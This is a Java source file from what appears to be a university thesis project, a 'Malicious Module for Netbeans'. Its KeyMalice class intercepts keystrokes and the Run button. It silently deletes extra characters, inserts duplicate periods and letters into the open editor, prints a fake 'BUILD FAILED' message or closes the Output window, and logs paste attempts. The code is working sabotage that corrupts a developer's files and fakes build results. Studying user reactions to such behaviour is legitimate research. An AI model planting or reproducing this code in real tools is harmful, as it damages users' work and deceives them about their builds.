/*
 * Gdańsk University of Technology - Engineering Thesis
 * Malicious Module for Netbeans
 *
 * Cilińdź Michał, Gabryelska Nela, Micał Marek
 */
package pl.gda.pg.eti.kio.malicious.entity;

import java.awt.Component;
import java.awt.EventQueue;
import java.awt.KeyEventDispatcher;
import java.awt.KeyboardFocusManager;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import javax.swing.JEditorPane;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyledDocument;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.netbeans.api.project.Project;
import org.netbeans.api.project.ProjectUtils;
import org.netbeans.api.project.ui.OpenProjects;
import org.openide.awt.Toolbar;
import org.openide.awt.ToolbarPool;
import org.openide.cookies.EditorCookie;
import org.openide.nodes.Node;
import org.openide.windows.IOProvider;
import org.openide.windows.InputOutput;
import org.openide.windows.TopComponent;
import org.openide.windows.WindowManager;
import pl.gda.pg.eti.kio.malicious.annotation.CreatableMalicious;
import pl.gda.pg.eti.kio.malicious.attribute.QuantityAttribute;
import pl.gda.pg.eti.kio.malicious.event.MaliciousEvent;

/**
 *
 * @author Marek Micał
 */
@CreatableMalicious(name = "key_malice")
public class KeyMalice extends BaseMalice implements KeyEventDispatcher, Runnable {

    private QuantityAttribute attributes;
    private final Logger log = LogManager.getLogger(KeyMalice.class);
    private String name = getClass().getSimpleName();
    private final Runnable fakeError = new Runnable() {
        @Override
        public void run() {
            OpenProjects op = OpenProjects.getDefault();
            try {
                Project[] proj = op.getOpenProjects();
                String projectName = ProjectUtils.getInformation(proj[0]).getName();
                InputOutput io = IOProvider.getDefault().getIO(projectName + " (run)", true);
                io.select();
                io.getErr().println("BUILD FAILED (total time: 0 seconds)");
                io.getErr().close();
                log.info("Completed: {} - {}", name, "FakeError completed successfully");
            } catch (Exception ex) {
                log.error("FakeError completed unsuccessfully", ex);
            }
        }
    };
    private final Runnable outputClose = new Runnable() {
        @Override
        public void run() {
            TopComponent output = WindowManager.getDefault().findTopComponent("output");
            if (output != null) {
                output.close();
                log.info("Completed: {} - {}", name, "OutputClose completed successfully");
            } else {
                log.error("OutputClose completed unsuccessfully");
            }
        }
    };
    MouseListener runListener = new MouseListener() {
        @Override
        public void mouseClicked(MouseEvent e) {
        }

        @Override
        public void mousePressed(MouseEvent e) {
        }

        @Override
        public void mouseReleased(MouseEvent e) {
            checkKey(KeyEvent.VK_F6, '-');
        }

        @Override
        public void mouseEntered(MouseEvent e) {
        }

        @Override
        public void mouseExited(MouseEvent e) {
        }
    };

    @Override
    protected void execute(MaliciousEvent event) {
        KeyboardFocusManager manager = KeyboardFocusManager.getCurrentKeyboardFocusManager();
        manager.addKeyEventDispatcher(this);
        this.initializeAttributes();

        //Dodanie nasłuchu na kliknięcie przycisku Run
        Toolbar build = ToolbarPool.getDefault().findToolbar("Build");
        if (build != null) {
            Component[] components = ToolbarPool.getDefault().findToolbar("Build").getComponents();
            Component run = components[4];
            run.addMouseListener(runListener);
        }

    }

    private void initializeAttributes() {
        String frequency = (String) (super.getParameter("frequency"));
        if ((frequency != null) && (!frequency.isEmpty()) && frequency.matches("\\d*-\\d*")) {
            attributes = new QuantityAttribute(frequency);
        } else {
            attributes = new QuantityAttribute(1, 1);
        }
        attributes.addCounter("backspace");
        attributes.addCounter("run");
        attributes.addCounter("char");
        attributes.addCounter("upperChar");
        attributes.addCounter("dot");
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent e) {
        if (e.getID() == KeyEvent.KEY_RELEASED) {

            if (e.getKeyCode() == KeyEvent.VK_V && ((e.getModifiers() & KeyEvent.CTRL_MASK) != 0)) {
                log.info("Info: {} - {}", name, "User's attempt to paste text");
            }

            checkKey(e.getKeyCode(), e.getKeyChar());
        }
        return false;
    }

    public void checkKey(int keyPressed, char keyPressedChar) {

        Node[] n = TopComponent.getRegistry().getActivatedNodes();

        if (n.length == 1) {
            EditorCookie ec = (EditorCookie) n[0].getLookup().lookup(EditorCookie.class);
            if (ec != null) {
                JEditorPane[] panes = ec.getOpenedPanes();
                if (panes != null && panes.length > 0) {

                    StyledDocument doc = (StyledDocument) panes[0].getDocument();
                    int caretPosition = panes[0].getCaretPosition();

                    switch (keyPressed) {

                        case KeyEvent.VK_F6:
                            manipulateOutput();
                            break;

                        case KeyEvent.VK_BACK_SPACE:  //Backspace
                            removeMoreCharacters(doc, caretPosition);
                            break;

                        case KeyEvent.VK_PERIOD: //"."
                            addPeriod(doc, keyPressedChar, caretPosition);
                            break;

                        default:
                            addOppositeCaseLetter(doc, keyPressedChar, caretPosition);
                            break;
                    }
                }
            }
        }

    }

    private void manipulateOutput() {

        //Wypisywanie w oknie Output
        if (attributes.checkCounter("run")) {
            if (Math.random() > 0.5) {
                new Runnable() {
                    public void run() {
                        try {
                            Thread.sleep(300);
                        } catch (InterruptedException ex) {
                        }
                        EventQueue.invokeLater(fakeError);
                    }
                }.run();
            } //Zamykanie komponentu Output
            else {
                new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(200);
                        } catch (InterruptedException ex) {
                        }
                        EventQueue.invokeLater(outputClose);
                    }
                }.run();
            }
        }

    }

    private void removeMoreCharacters(StyledDocument doc, int caretPosition) {

        //Usuwanie kilku więcej znaków
        if (attributes.checkCounter("backspace")) {
            try {
                int length = (int) (Math.random() * 4);
                doc.remove(caretPosition - length, length);
                log.info("Completed: {} - {}", name, "RemoveMoreCharacters completed successfully");
            } catch (BadLocationException ex) {
                log.error("RemoveMoreCharacters completed unsuccessfully", ex);
            }
        }

    }

    private void addPeriod(StyledDocument doc, char keyPressedChar, int caretPosition) {

        //Dodatkowa kropka
        if (attributes.checkCounter("dot")) {
            try {
                doc.insertString(caretPosition, Character.toString(keyPressedChar), null);
                log.info("Completed: {} - {}", name, "AddPeriod completed successfully");
            } catch (BadLocationException ex) {
                log.error("AddPeriod completed unsuccessfully", ex);
            }
        }

    }

    private void addOppositeCaseLetter(StyledDocument doc, char keyPressedChar, int caretPosition) {

        if (keyPressedChar >= 'a' && keyPressedChar <= 'z') {
            //Dorzucenie klawisza z capsem
            if (attributes.checkCounter("char")) {
                try {
                    doc.insertString(caretPosition, Character.toString(keyPressedChar), null);
                    log.info("Completed: {} - {}", name, "AddUpperCase completed successfully");
                } catch (BadLocationException ex) {
                    log.error("AddUpperCase completed unsuccessfully", ex);
                }
            }
        }
        if (keyPressedChar >= 'A' && keyPressedChar <= 'Z') {
            //Dorzucenie klawisza bez capsa
            if (attributes.checkCounter("upperChar")) {
                try {
                    doc.insertString(caretPosition, Character.toString(keyPressedChar), null);
                    log.info("Completed: {} - {}", name, "AddLowerCase completed successfully");
                } catch (BadLocationException ex) {
                    log.error("AddLowerCase completed unsuccessfully", ex);
                }
            }
        }

    }
}
